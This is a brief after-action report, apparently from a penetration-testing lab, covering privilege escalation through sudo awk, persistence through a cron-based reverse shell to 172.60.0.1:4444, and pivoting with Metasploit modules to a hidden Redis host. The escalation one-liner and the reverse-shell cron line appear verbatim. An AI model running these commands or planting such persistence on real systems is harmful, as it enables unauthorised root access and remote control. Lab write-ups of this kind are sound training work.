# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** wendkali

## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** /usr/bin/awk
* **GTFOBins Exploit Command Used:** sudo awk 'BEGIN {system("/bin/bash")}'
* **Verification:** whoami → root

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'
* **Persistence Confirmed:** Yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** auxiliary/scanner/ssh/ssh_login, post/multi/manage/autoroute, auxiliary/server/socks_proxy
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:** 6379 (Redis)
